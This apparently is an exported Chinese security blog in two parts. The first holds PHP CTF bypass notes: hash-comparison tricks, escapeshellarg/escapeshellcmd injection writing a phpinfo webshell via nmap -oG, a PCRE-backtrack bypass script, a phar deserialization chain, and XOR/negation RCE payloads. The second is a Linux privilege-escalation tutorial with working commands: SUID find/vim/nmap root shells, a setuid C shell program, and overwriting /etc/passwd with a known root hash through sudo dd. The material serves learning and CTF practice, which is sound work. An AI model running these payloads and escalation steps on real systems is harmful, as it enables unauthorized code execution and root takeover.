<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;payload&quot;</span>, <span class="number">1</span>);<span class="variable">$b</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;payload&quot;</span>, <span class="number">2</span>);<span class="comment">//注意这里需要写在一行上</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$a</span> != <span class="variable">$b</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;a!=b&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>) === <span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;md5相等&quot;</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">sha1</span>(<span class="variable">$a</span>) === <span class="title function_ invoke__">sha1</span>(<span class="variable">$b</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;sha1相等&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>a!&#x3D;b</p>
<p>md5相等</p>
<p>sha1相等</p>
</blockquote>
<p>这道题，</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\&lt;\?php|\(|\)|\&quot;|\&#x27;/&quot;</span>, <span class="variable">$this</span>-&gt;syc, <span class="variable">$match</span>)</span><br></pre></td></tr></table></figure>

<p>将<code>&lt;?php</code>和<code>(</code>、<code>)</code>、<code>‘</code>、<code>“</code>都过滤了</p>
<p>而<code>&lt;? ?&gt;</code>相当于对<code>&lt;?php ?&gt;</code>的替换。而<code>&lt;?= ?&gt;</code>则是相当于<code>&lt;?php echo ... ?&gt;</code></p>
<p>于是可以进行替换绕过，</p>
<p>于是第一行大概就有了，必须先闭合原有代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$str</span> = <span class="string">&quot;?&gt;&lt;?=</span></span><br></pre></td></tr></table></figure>

<p>然后因为括号以及引号被过滤了，</p>
<p>所以system()和phpinfo()这些都不行，</p>
<p>但是如果直接包含读取文件，也需要引号，</p>
<p>我们直接用url取反绕过即可</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$str</span> = <span class="string">&quot;?&gt;&lt;?= include ~&quot;</span> . ~<span class="string">&quot;/flag&quot;</span> . <span class="string">&quot;?&gt;&quot;</span>;</span><br></pre></td></tr></table></figure>

<h2 id="12-escapeshellarg-和-escapeshellcmd"><a href="#12-escapeshellarg-和-escapeshellcmd" class="headerlink" title="12)escapeshellarg 和 escapeshellcmd"></a>12)escapeshellarg 和 escapeshellcmd</h2><p>escapeshellarg 和 escapeshellcmd 两个函数在代码的注释里面已经解释了其用法。</p>
<p>也就是说在host变量里面我们不能使用 ; &amp; | 等符号来执行多条命令，不过题目里面提示了我们RCE，同时对于这两个函数简单查找了之后，发现两个一起使用的时候存在漏洞</p>
<p>漏洞解释链接如下：</p>
<p><a href="http://www.lmxspace.com/2018/07/16/%E8%B0%88%E8%B0%88escapeshellarg%E5%8F%82%E6%95%B0%E7%BB%95%E8%BF%87%E5%92%8C%E6%B3%A8%E5%85%A5%E7%9A%84%E9%97%AE%E9%A2%98/">http://www.lmxspace.com/2018/07/16/%E8%B0%88%E8%B0%88escapeshellarg%E5%8F%82%E6%95%B0%E7%BB%95%E8%BF%87%E5%92%8C%E6%B3%A8%E5%85%A5%E7%9A%84%E9%97%AE%E9%A2%98/</a></p>
<p>简单来说</p>
<blockquote>
<p>传入的参数是：<code>172.17.0.2&#39; -v -d a=1</code></p>
<p>经过<code>escapeshellarg</code>处理后变成了<code>&#39;172.17.0.2&#39;\&#39;&#39; -v -d a=1&#39;</code>，即先对单引号</p>
<p>转义，再用单引号将左右两部分括起来从而起到连接的作用。</p>
<p>经过<code>escapeshellcmd</code>处理后变成<code>&#39;172.17.0.2&#39;\\&#39;&#39; -v -d a=1\&#39;</code>，这是因为</p>
<p><code>escapeshellcmd</code>对<code>\</code>以及最后那个不配对儿的引号进行了转义</p>
<p>最后执行的命令是<code>curl &#39;172.17.0.2&#39;\\&#39;&#39; -v -d a=1\&#39;</code>，由于中间的\被解释为\而不再是转义字符，</p>
<p>所以后面的’没有被转义，与再后面的’配对儿成了一个空白连接符。所以可以简化为curl </p>
<p>172.17.0.2\ -v -d a&#x3D;1’，即向172.17.0.2\发起请求，POST 数据为a&#x3D;1’。</p>
</blockquote>
<p>　所以经过我们构造之后，输入的值被分割成为了三部分，第一部分就是curl的IP，为172.17.0.2\ ，第二部分就是两个配对的单引号 ‘ ‘ ，第三部分就是命令参数以及对象 -v -d a&#x3D;1’</p>
<p>于是我们可以参数绕过这两个过滤函数。</p>
<p>同时，为了构造命令读取flag,我们应当从nmap入手，查资料可以知道，nmap有一个参数-oG可以实现将命令和结果写到文件</p>
<p>所以我们可以控制自己的输入写入文件，这里我们可以写入一句话木马链接，也可以直接命令 cat flag</p>
<p>构造的payload为:</p>
<figure class="highlight php-template"><table><tr><td class="code"><pre><span class="line"><span class="language-xml">?host``=``&#x27; </span><span class="language-php"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="title function_ invoke__">phpinfo</span>();<span class="meta">?&gt;</span></span><span class="language-xml"> -oG test.php &#x27;</span></span><br></pre></td></tr></table></figure>



<h2 id="13-利用PCRE回溯次数限制绕过某些安全限制"><a href="#13-利用PCRE回溯次数限制绕过某些安全限制" class="headerlink" title="13)利用PCRE回溯次数限制绕过某些安全限制"></a>13)利用PCRE回溯次数限制绕过某些安全限制</h2><blockquote>
<p>PHP为了防止DOS攻击。给pcre设置了一个回溯上限。默认是100万<code>PHP &lt; 5.3.7</code><br><code>var_dump(ini_get(&#39;pcre.backtrack_limit&#39;))</code><br>当待匹配的字符串超过100W，函数就会返回False。也就没未匹配到字符。<br>那么就可以绕过判断执行恶意代码</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">payload = <span class="string">&#x27;&#123;&quot;cmd&quot;:&quot;/bin/cat /home/rceservice/flag&quot;,&quot;test&quot;:&quot;&#x27;</span> + <span class="string">&quot;a&quot;</span>*(<span class="number">1000000</span>) + <span class="string">&#x27;&quot;&#125;&#x27;</span></span><br><span class="line">res = requests.post(<span class="string">&quot;http://xxxx/&quot;</span>, data=&#123;<span class="string">&quot;cmd&quot;</span>:payload&#125;)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure>

<p>putenv(‘PATH&#x3D;&#x2F;home&#x2F;rceservice&#x2F;jail’)，jail应用于当前环境，</p>
<p>只允许使用绝对路径执行命令，比如<code>/bin/cat</code>，而不能用<code>cat</code></p>
<h2 id="14-basename"><a href="#14-basename" class="headerlink" title="14)basename"></a>14)basename</h2><p><code>basename</code>可以理解为对传入的参数路径截取最后一段作为返回值，但是该函数发现最后一段为不可见字符时会退取上一层的目录，即：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$var1</span>=<span class="string">&quot;/config.php/test&quot;</span></span><br><span class="line"><span class="built_in">basename</span>(<span class="variable">$var1</span>)	=&gt; <span class="built_in">test</span></span><br><span class="line"><span class="variable">$var2</span>=<span class="string">&quot;/config.php/%ff&quot;</span></span><br><span class="line"><span class="built_in">basename</span>(<span class="variable">$var2</span>)	=&gt;	config.php</span><br></pre></td></tr></table></figure>

<h2 id="15-phar反序列化"><a href="#15-phar反序列化" class="headerlink" title="15)phar反序列化"></a>15)phar反序列化</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C1e4r</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;str = <span class="keyword">new</span> <span class="title class_">Show</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;str[<span class="string">&#x27;str&#x27;</span>]=<span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$params</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;params[<span class="string">&#x27;source&#x27;</span>]=<span class="string">&quot;/var/www/html/f1ag.php&quot;</span>;</span><br><span class="line">        <span class="comment">#不知道为啥这里路径采用f1ag.php就读取不了</span></span><br><span class="line">        <span class="comment">#可能是当前目录不在/var/www/html下,但是那又会在哪a...</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#$a=new C1e4r();</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span> =<span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;awsl.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;XXX&lt;?php XXX __HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">C1e4r</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>读取上传的文件，phar:&#x2F;&#x2F;【上传的文件后的名字并且包括路径】</p>
<h2 id="16-json-decode"><a href="#16-json-decode" class="headerlink" title="16)json_decode"></a>16)json_decode</h2><figure class="highlight autoit"><table><tr><td class="code"><pre><span class="line">$body = file_get_contents(<span class="string">&#x27;php://input&#x27;</span>)<span class="comment">;</span></span><br><span class="line">$json = json_decode($body, <span class="literal">true</span>)<span class="comment">;</span></span><br></pre></td></tr></table></figure>

<p>json解析时的关键字过滤可以采用unicode编码，json是支持用unicode编码直接表示对应字符的，如下两个写法是等价的。</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;poc&quot;</span><span class="punctuation">:</span><span class="string">&quot;php&quot;</span><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;poc&quot;</span><span class="punctuation">:</span><span class="string">&quot;\u0070\u0068\u0070&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>至于结果的过滤就好办了，采用<code>php</code>伪协议的<code>filter</code>进行下base64编码就好了，最终构造如下payload：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;page&quot;</span><span class="punctuation">:</span><span class="string">&quot;\u0070\u0068\u0070://filter/convert.base64-encode/resource=/\u0066\u006c\u0061\u0067&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<h2 id="17-取反-异或-绕过无参RCE"><a href="#17-取反-异或-绕过无参RCE" class="headerlink" title="17)取反&#x2F;异或 绕过无参RCE"></a>17)取反&#x2F;异或 绕过无参RCE</h2><p>与字串相同长度的<code>%ff</code>异或相当于取反</p>
<figure class="highlight gcode"><table><tr><td class="code"><pre><span class="line">$&#123;<span class="meta">%</span>ff<span class="meta">%</span>ff<span class="meta">%</span>ff<span class="meta">%</span>ff^<span class="meta">%</span>a<span class="number">0</span><span class="meta">%</span>b<span class="number">8</span><span class="meta">%</span>ba<span class="meta">%</span>ab&#125;&#123;<span class="meta">%</span>ff&#125;<span class="comment">()</span>;&amp;<span class="meta">%</span>ff=phpi<span class="symbol">nfo</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>daily</category>
      </categories>
      <tags>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux特殊权限位</title>
    <url>/Linux-PowerUp/</url>
    <content><![CDATA[<p><code>linux提权学习</code></p>
<span id="more"></span>

<h1 id="Linux提权"><a href="#Linux提权" class="headerlink" title="Linux提权"></a>Linux提权</h1><p><a href="https://mp.weixin.qq.com/s?__biz=MzAxMjcxMjkyOA==&mid=2247484922&idx=1&sn=ba666d73dc1ed57385eda7210afca433&chksm=9baceb75acdb62634d94269e2052f2856bcebac7e1b0962f30132cbda7494813ae6ad2c0f88c&mpshare=1&scene=23&srcid=0830y3hzCRRlcsleoKEyGZr8&sharer_sharetime=1661831991788&sharer_shareid=30776e1834041fdca5e0b68533a2427e#rd">参考文章</a></p>
<h2 id="1）利用SUID提权"><a href="#1）利用SUID提权" class="headerlink" title="1）利用SUID提权"></a>1）利用SUID提权</h2><h3 id="什么是suid？"><a href="#什么是suid？" class="headerlink" title="什么是suid？"></a>什么是suid？</h3><blockquote>
<p>Set User ID的一种权限类型，允许用户使用指定的用户权限执行文件。那些具用suid权限的文件以最高的权限运行。假设我们以非root用户身份访问目标系统，并且我们发现二进制文件启用了suid位，那么<br>这些文件&#x2F;程序&#x2F;命令可以以root权限运行</p>
<p>SUID的目的就是：让本来没有相应权限的用户运行这个程序时，可以访问他没有权限的资源</p>
</blockquote>
<h3 id="什么是SGID"><a href="#什么是SGID" class="headerlink" title="什么是SGID"></a>什么是SGID</h3><blockquote>
<p>G的意思就是<code>group</code>，功能和<code>suid</code>基本不相同，唯一区别就是<code>suid</code>获得命令所属用户的身份和权限，而<code>sgid</code>是获取所属用户组的身份和权限</p>
</blockquote>
<h3 id="SUID权限"><a href="#SUID权限" class="headerlink" title="SUID权限"></a>SUID权限</h3><blockquote>
<p>1，SUID权限只能设置二进制文件。</p>
<p>2，命令执行者要有二进制文件的执行权。</p>
<p>3，命令执行者执行二进制文件时会获得该程序的属主身份。</p>
<p>4，SUID权限只在程序执行过程中有效。</p>
<p>即如果root给一个程序赋予了SUID权限，则普通用户在执行该程序过程中，是root权限。</p>
</blockquote>
<hr>
<h3 id="关键"><a href="#关键" class="headerlink" title="*关键"></a>*关键</h3><p>1.查看具有<code>root</code>用户权限的<code>SUID</code>二进制可执行文件</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="built_in">find</span> / -perm <span class="attribute">-u</span>=s -type f 2&gt;/dev/<span class="literal">null</span></span><br><span class="line"></span><br><span class="line">命令来查找拥有SUID权限的程序。</span><br><span class="line"></span><br><span class="line">perm指定权限，<span class="attribute">-u</span>=s代表SUID权限，type指定文件类型，f表示常规文件</span><br></pre></td></tr></table></figure>

<p>2.已知的可用来提权的<code>linux</code>可执行的文件列表如下</p>
<figure class="highlight dos"><table><tr><td class="code"><pre><span class="line">Nmap、Vim、<span class="built_in">find</span>、Bash、<span class="built_in">More</span>、Less、Nano、cp</span><br></pre></td></tr></table></figure>

<hr>
<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><h4 id="（1）利用find获取root权限shell"><a href="#（1）利用find获取root权限shell" class="headerlink" title="（1）利用find获取root权限shell"></a>（1）利用find获取root权限shell</h4><figure class="highlight sqf"><table><tr><td class="code"><pre><span class="line"><span class="built_in">find</span> / -<span class="built_in">name</span> filename -<span class="built_in">exec</span> “/bin/sh” \;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>这个filename，只要存在就行，目的是让find命令可以成功执行，后面的-exec就是加上命令</p>
<p>这里find有suid权限，普通用户执行时，会变成root用户，执行&#x2F;bin&#x2F;sh命令时，会进入root用户，从而实现提权</p>
<p>如果find没有suid权限，执行&#x2F;bin&#x2F;sh命令后，仍然是普通用户</p>
<p>·&#x2F;为根目录<br>·-name 按文件名查找<br>·-exec 对匹配对象执行的命令，以;结束<br>但是（;）是特殊字符，需要用（\）转义</p>
</blockquote>
<h4 id="（2）利用cp获取root权限shell"><a href="#（2）利用cp获取root权限shell" class="headerlink" title="（2）利用cp获取root权限shell"></a>（2）利用cp获取root权限shell</h4><blockquote>
<p>以cp为例，这里给cp添加SUID权限做测试，拥有SUID权限的程序会有rwx变成rws。</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/Linux-PowerUp/image-20220830133409844.png"><img src="/Linux-PowerUp/image-20220830133409844.png" alt="image-20220830133409844"></a></p>
<p>可以通过</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="built_in">find</span> / -perm <span class="attribute">-u</span>=s -type f 2&gt;/dev/<span class="literal">null</span></span><br></pre></td></tr></table></figure>

<p>命令来查找拥有SUID权限的程序。</p>
<p><a data-fancybox="gallery" data-src="/Linux-PowerUp/image-20220830133446426.png"><img src="/Linux-PowerUp/image-20220830133446426.png" alt="image-20220830133446426"></a></p>
<blockquote>
<p>当普通用户运行cp命令时，此时的cp权限就为root，利用时，可以cp把&#x2F;etc&#x2F;passwd复制到桌面，然后进行修改。</p>
<p>首先用openssl生成一个密码。passwd参数代表生成一个密码，-1为md5，-salt指定盐（随意指定），最后跟要加密的值，也就是密码abcd</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/Linux-PowerUp/image-20220830133504874.png"><img src="/Linux-PowerUp/image-20220830133504874.png" alt="image-20220830133504874"></a></p>
<blockquote>
<p>然后按照etc&#x2F;passwd的格式添加一个新用户，权限按root的写即可。</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/Linux-PowerUp/image-20220830133645874.png"><img src="/Linux-PowerUp/image-20220830133645874.png" alt="image-20220830133645874"></a></p>
<blockquote>
<p>添加后我们用cp再把文件复制回去进行替换，此时就添加了一个abcd用户，权限为root。</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/Linux-PowerUp/image-20220830133656254.png"><img src="/Linux-PowerUp/image-20220830133656254.png" alt="image-20220830133656254"></a></p>
<h4 id="（3）利用Vim获取root权限shell"><a href="#（3）利用Vim获取root权限shell" class="headerlink" title="（3）利用Vim获取root权限shell"></a>（3）利用Vim获取root权限shell</h4><blockquote>
<p>vim在有SUID权限的情况下，也可用来进行提权操作。</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/Linux-PowerUp/image-20220830134124700.png"><img src="/Linux-PowerUp/image-20220830134124700.png" alt="image-20220830134124700"></a></p>
<blockquote>
<p>当vim被赋予suid权限后，意味着任何用户都可以使用vim命令来编辑那些只能由root编辑的文件，例如通过vim来编辑etc&#x2F;sudoers文件（普通用户会被直接拒绝访问），在sudoers文件中配置普通用户的权限，权限和root一样，这里以test用户为例，添加如下内容：</p>
</blockquote>
<figure class="highlight subunit"><table><tr><td class="code"><pre><span class="line"><span class="keyword">test   </span>ALL=(ALL:ALL) ALL</span><br></pre></td></tr></table></figure>

<blockquote>
<p>vim编辑后保存时用wq!强制保存，vim运行时虽然是root权限，但wq依然会提示只读。</p>
<p>随后sudo bash就会获取一个root的shell。</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/Linux-PowerUp/image-20220830134159252.png"><img src="/Linux-PowerUp/image-20220830134159252.png" alt="image-20220830134159252"></a></p>
<h4 id="（4）利用nmap获取root权限shell"><a href="#（4）利用nmap获取root权限shell" class="headerlink" title="（4）利用nmap获取root权限shell"></a>（4）利用nmap获取root权限shell</h4><h5 id="1-旧版"><a href="#1-旧版" class="headerlink" title="1.旧版"></a>1.旧版</h5><blockquote>
<p>nmap（2.02-5.21）存在交换模式，可利用提权</p>
</blockquote>
<figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">nmap <span class="comment">--interactive</span></span><br></pre></td></tr></table></figure>

<p>之后执行:</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">nmap</span>&gt; !sh</span><br><span class="line"><span class="attribute">sh</span>-<span class="number">3</span>.<span class="number">2</span># whoami</span><br><span class="line"><span class="attribute">root</span></span><br></pre></td></tr></table></figure>

<p>msf中的模块为：</p>
<figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line">exploit/unix/<span class="keyword">local</span>/setuid_nmap</span><br></pre></td></tr></table></figure>

<h5 id="2-新版"><a href="#2-新版" class="headerlink" title="2.新版"></a>2.新版</h5><blockquote>
<p>较新版可使用 <code>--script</code> 参数：</p>
</blockquote>
<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">先写入一条命令</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;os.execute(&#x27;/bin/sh&#x27;)&quot;</span> &gt; getshell</span><br><span class="line">再<span class="params">--script</span>参数，执行</span><br><span class="line">sudo nmap <span class="params">--script=getshell</span></span><br></pre></td></tr></table></figure>

<p>成功提权</p>
<p><a data-fancybox="gallery" data-src="/Linux-PowerUp/image-20221011132253611.png"><img src="/Linux-PowerUp/image-20221011132253611.png" alt="image-20221011132253611"></a></p>
<h4 id="（5）利用脚本获取root权限shell"><a href="#（5）利用脚本获取root权限shell" class="headerlink" title="（5）利用脚本获取root权限shell"></a>（5）利用脚本获取root权限shell</h4><blockquote>
<p>除了系统的一些可执行命令，自己写的可执行文件也可添加SUID权限。不论c或者go或者其他语言都可以，这里以c为例。</p>
</blockquote>
<p>示例代码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  setuid(geteuid());</span><br><span class="line">  system(<span class="string">&quot;/bin/bash&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用gcc进行编译。</p>
<p><a data-fancybox="gallery" data-src="/Linux-PowerUp/image-20220830134227202.png"><img src="/Linux-PowerUp/image-20220830134227202.png" alt="image-20220830134227202"></a></p>
<p>编译后传入目标机，这里放到bin&#x2F;aaa目录下，然后添加SUID权限测试。</p>
<p><a data-fancybox="gallery" data-src="/Linux-PowerUp/image-20220830134236889.png"><img src="/Linux-PowerUp/image-20220830134236889.png" alt="image-20220830134236889"></a></p>
<p>普通用户执行该文件后，会返回一个root权限的shell。</p>
<p><a data-fancybox="gallery" data-src="/Linux-PowerUp/image-20220830134252824.png"><img src="/Linux-PowerUp/image-20220830134252824.png" alt="image-20220830134252824"></a></p>
<h2 id="2）利用SUDO提权"><a href="#2）利用SUDO提权" class="headerlink" title="2）利用SUDO提权"></a>2）利用SUDO提权</h2><h3 id="sudo和su的区别"><a href="#sudo和su的区别" class="headerlink" title="sudo和su的区别"></a><strong>sudo和su的区别</strong></h3><blockquote>
<p>1，sudo是以root权限去运行一个命令，su是去切换用户的身份。</p>
<p>2，sudo只要知道自己的密码即可，su需要知道被切换用户的密码。</p>
</blockquote>
<h3 id="sudoers文件"><a href="#sudoers文件" class="headerlink" title="sudoers文件"></a><strong>sudoers文件</strong></h3><blockquote>
<p>&#x2F;etc&#x2F;sudoers文件，是sudo权限的配置文件。当使用sudo接命令时，linux系统会在sudoers文件中查找当前用户，根据当前用户权限配置来决定是否可以运行相关命令。</p>
</blockquote>
<p>例如添加test用户的相关配置：</p>
<p><a data-fancybox="gallery" data-src="/Linux-PowerUp/image-20220901223741370.png"><img src="/Linux-PowerUp/image-20220901223741370.png" alt="image-20220901223741370"></a></p>
<p>格式如下：</p>
<p><a data-fancybox="gallery" data-src="/Linux-PowerUp/image-20220901223808981.png"><img src="/Linux-PowerUp/image-20220901223808981.png" alt="image-20220901223808981"></a></p>
<h3 id="sudo-su-sudo-bash"><a href="#sudo-su-sudo-bash" class="headerlink" title="sudo su &amp;&amp; sudo bash"></a><strong>sudo su &amp;&amp; sudo bash</strong></h3><blockquote>
<p>当没有对普通用户做严格的限制时，或者配置权限过大时，则可以尝试sudo su来切换到root权限。</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/Linux-PowerUp/image-20220901223824172.png"><img src="/Linux-PowerUp/image-20220901223824172.png" alt="image-20220901223824172"></a></p>
<blockquote>
<p>或者执行sudo bash。</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/Linux-PowerUp/image-20220901223837242.png"><img src="/Linux-PowerUp/image-20220901223837242.png" alt="image-20220901223837242"></a></p>
<blockquote>
<p>当visudo命令不能用时，限制了部分命令，则可以尝试下vim是否被禁用，sudo vim也可以编辑sudoers文件，且wq!可以成功保存。</p>
</blockquote>
<h4 id="SUDO-dd-提权法"><a href="#SUDO-dd-提权法" class="headerlink" title="*SUDO -dd 提权法"></a>*SUDO -dd 提权法</h4><p><a href="https://www.cnblogs.com/zlgxzswjy/p/12746160.html">原文</a>            </p>
<blockquote>
<p>当用户可以通过sudo执行dd命令时，可以被用来提权。通过dd命令覆盖原始&#x2F;etc&#x2F;passwd文件，以达到修改密码的目的</p>
</blockquote>
<p>1、创建一个已知密码的hash，以备替换时使用</p>
<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">hh<span class="variable">@hh</span><span class="symbol">:/etc</span><span class="variable">$ </span>openssl passwd <span class="number">-1</span> -salt <span class="number">123</span> password </span><br><span class="line"><span class="variable">$1</span><span class="variable">$123</span><span class="variable">$0HaaUtbhct</span>/mZ/Q/<span class="title class_">KRa5a</span>.</span><br></pre></td></tr></table></figure>

<p>2、备份原始passwd文件，以防修改错误时无法访问</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">cp</span> /etc/passwd /tmp/passwd</span></span><br></pre></td></tr></table></figure>

<p>3、利用第一步里生成的hash构建新的passwd hash条目</p>
<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">hh<span class="variable">@hh</span><span class="symbol">:/tmp</span><span class="comment"># cat passwd</span></span><br><span class="line"><span class="symbol">root:</span><span class="variable">$1</span><span class="variable">$123</span><span class="variable">$0HaaUtbhct</span>/mZ/Q/<span class="symbol">KRa5a.:</span><span class="number">0</span><span class="symbol">:</span><span class="number">0</span><span class="symbol">:root</span><span class="symbol">:/root</span><span class="symbol">:/bin/bash</span></span><br></pre></td></tr></table></figure>

<p>4、使用dd覆盖原始passwd文件</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">hh</span>@hh:/tmp$ cat passwd|sudo dd of=/etc/passwd </span><br><span class="line"><span class="attribute">3</span>+<span class="number">1</span> records in </span><br><span class="line"><span class="attribute">3</span>+<span class="number">1</span> records out</span><br><span class="line"><span class="attribute">1757</span> bytes (<span class="number">1</span>.<span class="number">8</span> kB, <span class="number">1</span>.<span class="number">7</span> KiB) copied, <span class="number">0</span>.<span class="number">000397129</span> s, <span class="number">4</span>.<span class="number">4</span> MB/s</span><br></pre></td></tr></table></figure>

<p>5、使用刚才创建hash时使用的密码进行登录</p>
<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">hh<span class="variable">@hh</span><span class="symbol">:/tmp</span><span class="variable">$su</span> root</span><br><span class="line"><span class="symbol">Password:</span></span><br><span class="line">root<span class="variable">@hh</span><span class="symbol">:/tmp</span><span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p>提权成功！</p>
<h4 id="GIT"><a href="#GIT" class="headerlink" title="*GIT"></a>*GIT</h4><figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line">输入sudo -l</span><br><span class="line"><span class="comment">//列出目前用户可执行与无法执行的指令。</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/Linux-PowerUp/image-20220901112624228.png"><img src="/Linux-PowerUp/image-20220901112624228.png" alt="image-20220901112624228"></a></p>
